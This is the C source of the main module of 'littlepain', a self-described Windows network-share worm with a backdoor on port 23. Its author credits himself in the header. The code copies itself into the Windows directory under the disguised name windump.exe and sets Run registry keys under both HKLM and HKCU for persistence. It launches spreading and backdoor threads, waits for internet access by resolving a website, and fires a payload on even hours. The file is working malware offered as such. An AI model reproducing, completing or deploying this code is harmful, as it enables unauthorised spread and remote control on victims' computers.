/**********************************************************************
 * Name: littlepain                                                   *
 * Type: Windows shares worm and backdoor (on port 23/tcp)            *
 * Author: WarGame                                                    *
 * Payload: Print a msg (with user's printer) and display a msg       *
 *                                                                    *
 * Hi guy! This is my first worm using this way of spreading ...      *
 * This worm will try to spread copying itself in several default     *
 * shares (ADMIN$,C$ and so on ...) of random generated ip address    *
 * and using hard-coded address (lan ip: 192.168.x.x).                *
 * Ok, this is all!!! This code could be buggy ... but give me time   *
 * I am learning :)                                                   *
 * You can contact me at: wargame89@yahoo.it                          *
 **********************************************************************/

#include "littlepain.h"

/* set at autostart */
void AutoStart(char *my_path)
{
	HKEY hkey;

	 if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,
		 "Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,
		 KEY_WRITE,&hkey)==ERROR_SUCCESS)
	 {
			RegSetValueEx(hkey,"windump",0,REG_SZ,my_path,strlen(my_path));
			RegCloseKey(hkey);
	 }

	 if(RegOpenKeyEx(HKEY_CURRENT_USER,
		 "Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,
		 KEY_WRITE,&hkey)==ERROR_SUCCESS)
	 {
			RegSetValueEx(hkey,"windump",0,REG_SZ,my_path,strlen(my_path));
			RegCloseKey(hkey);
	 }
}

int __stdcall WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
	char my_path[MAX_PATH],new_path[MAX_PATH];
	DWORD ThreadID;
	WSADATA wsa;
	SYSTEMTIME time;
		
	CreateMutex(NULL,FALSE,"__[__ littlepain by [WarGame,#eof] __]__");

	if(GetLastError() == ERROR_ALREADY_EXISTS)
	{
		ExitProcess(0);
	}
	
	GetModuleFileName(NULL,my_path,MAX_PATH);

	GetWindowsDirectory(new_path,MAX_PATH);

	strcat(new_path,"\\windump.exe");

	CopyFile(my_path,new_path,FALSE);
  	
	AutoStart(new_path);
	
	 /* initialize winsock */
	if(WSAStartup(MAKEWORD(1,1),&wsa) != 0)
	{
		return 0;
	}
	
	/* Create spreading threads */
	CreateThread(NULL,0,&L0cal,new_path,0,&ThreadID);

	/* backdoor :) */
	CreateThread(NULL,0,&BackDoor,0,0,&ThreadID);
	
	/* connected to internet? */
	while(!gethostbyname("www.freetibet.org")) 
	{
		Sleep(1000*60*20);
	}
	
	CreateThread(NULL,0,&extra,new_path,0,&ThreadID);

	GetSystemTime(&time);

	if(time.wHour % 2 == 0)
	{
		/* active payload ! */
		Payload();
	}
	
	Sleep(INFINITE);
}